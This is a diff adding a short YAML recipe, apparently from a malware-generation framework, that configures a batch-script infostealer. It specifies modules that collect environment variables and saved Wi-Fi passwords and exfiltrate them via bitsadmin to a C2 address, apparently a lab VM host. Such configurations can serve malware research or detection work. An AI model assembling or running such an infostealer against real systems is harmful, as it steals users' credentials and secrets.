@@ -1,0 +1,16 @@
+name: infostealer_batch_cs_v2
+description: Auto-generated recipe by Hermes (batch)
+format: batch
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/env_vars
+- collectors/wifi_passwords
+exfil: exfil/bitsadmin_lolbin
+arch: arch/sequential
+evasion: []
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
